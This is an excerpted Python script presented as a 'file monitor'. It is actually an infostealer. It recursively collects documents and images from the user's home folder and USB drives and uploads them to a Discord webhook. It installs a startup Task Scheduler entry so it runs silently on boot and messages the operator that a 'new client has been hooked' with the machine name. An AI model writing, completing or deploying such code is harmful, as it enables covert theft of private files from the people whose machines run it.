...
# Initialize logging
logging.basicConfig(filename='file_monitor.log', level=logging.ERROR)
...
# Function to create a Task Scheduler task to run the script at startup
def create_task_scheduler_task():
    try:
        import subprocess

        # Create a task to run the script at startup
        task_name = "FileMonitor"
        script_path = os.path.abspath(__file__)
        task_action = f'start pythonw.exe "{script_path}"'

        subprocess.run(["schtasks", "/create", "/tn", task_name, "/sc", "onstart", "/tr", task_action], check=True)

        print(f"Task '{task_name}' created to run the script at startup.")
    except Exception as e:
        logging.error(f"Error creating Task Scheduler task: {str(e)}")

# Function to monitor a specific directory (USB drive)
def monitor_usb_drive(drive_letter):
    usb_drive_path = drive_letter + ":\\"

    for root, _, files in os.walk(usb_drive_path):
        for file in files:
            file_path = os.path.join(root, file)
            if is_document_or_image(file_path):
                threading.Thread(target=upload_file_to_discord, args=(file_path,)).start()

# Function to check if a file is a document or image
def is_document_or_image(file_path):
    allowed_extensions = ['.txt', '.pdf', '.png', '.jpg', '.jpeg', '.xlsx', '.docx', '.pptx']
    return os.path.splitext(file_path)[1].lower() in allowed_extensions

# Function to send a progress message to Discord
def send_progress_to_discord(message):
    try:
        discord_payload = {
            "content": message,
            "embeds": [
                {
                    ...
                    "description": os.environ['COMPUTERNAME'],
                    "color": 0x00ff00
                }
            ]
        }
...
def upload_file_to_discord(file_path):
    global rate_limit_reset_time, rate_limit_remaining
    ...
    try:
        ...
        if rate_limit_remaining <= 0:
            ...
            if rate_limit_reset_time > current_time:
                # Calculate a random delay between 3 to 9 seconds
        ...
        with open(file_path, "rb") as f:
            ...
            if response.status_code != 204:
                ...
                if response.status_code == 429:
                    # Rate limit exceeded - retry with random delay
                    delay = random.randint(3, 9)
                    print(f"Rate limit exceeded - retrying in {delay} seconds")
                    time.sleep(delay)
                    upload_file_to_discord(file_path)
            else:
                print(f"Successfully uploaded file {file_path}")
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")

# Function to monitor connected USB drives
def monitor_connected_usb_drives():
    try:
        # Get a list of connected USB drives
        usb_drives = [drive.device for drive in psutil.disk_partitions() if 'removable' in drive.opts]

        if usb_drives:
            # Print the connected USB drives
            print(f"Connected USB Drives: {', '.join(usb_drives)}")
            return usb_drives
        else:
            print("No connected USB drives found.")
            return []
    except Exception as e:
...
def run_file_monitoring():
    try:
        send_progress_to_discord("Script started. Monitoring initiated.")

        print("Monitoring started. Press Ctrl+C to stop.")

        # Send a notification to Discord indicating a new client has been hooked
        machine_info = os.environ['COMPUTERNAME']
        send_progress_to_discord(f"New client has been hooked on machine: {machine_info}")

        # Create a Task Scheduler task to run the script at startup
        create_task_scheduler_task()

        # Start continuous monitoring of file changes
        while True:
            for drive_letter in ['C', 'D', 'E']:  # Replace with the drive letters you want to monitor
                if drive_letter == 'C':
                    monitor_user_folder(drive_letter)
                else:
            ...
            time.sleep(10800)  # Sleep for 3 hours before checking again

            # Send a progress update message after each monitoring cycle
            send_progress_to_discord("Monitoring cycle completed.")
    except KeyboardInterrupt:
        send_progress_to_discord("Monitoring stopped. Script terminated.")
        print("Monitoring stopped. Script terminated.")
    except Exception as e:
        send_progress_to_discord(f"An error occurred: {str(e)}")
        logging.error(f"An error occurred: {str(e)}")

# Function to monitor the user folder on the C drive
def monitor_user_folder(drive_letter):
    user_folder_path = os.path.expanduser("~")
    excluded_folders = ["AppData", "Windows", "System32"]  # Add folders you want to exclude here
    for root, dirs, files in os.walk(user_folder_path):
        # Exclude hidden folders, specified excluded folders, and system folders
        dirs[:] = [d for d in dirs if not d.startswith('.') and d not in excluded_folders and not os.path.islink(os.path.join(root, d))]
        for file in files:
            file_path = os.path.join(root, file)
            if is_document_or_image(file_path):
                threading.Thread(target=upload_file_to_discord, args=(file_path,)).start()

# Function to check user activity (placeholder, you can implement your logic here)
def check_user_activity():
    # Placeholder logic to check CPU usage
